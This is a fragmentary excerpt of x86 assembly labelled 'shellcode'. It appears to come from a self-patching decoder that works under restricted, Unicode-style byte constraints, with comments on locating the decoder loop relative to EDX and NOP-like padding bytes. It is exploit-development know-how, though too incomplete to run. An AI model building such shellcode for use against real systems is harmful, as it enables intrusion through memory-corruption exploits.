...
shellcode:
    ...
    ; start patching. Assuming EDX points to the baseaddress of this code,
    ; the decoder loop will be around EDX+0x100. Since our limited instruction
    ...
    POP     EAX                         ; eax = 0xs1s2s3s4 (*stack)
                    db 0x00, 0x42, 0x00 ;NOP - ADD [EDX+0], AL
    POP     ECX                         ; ecx = 0xA1A2A3A4 (baseaddress)
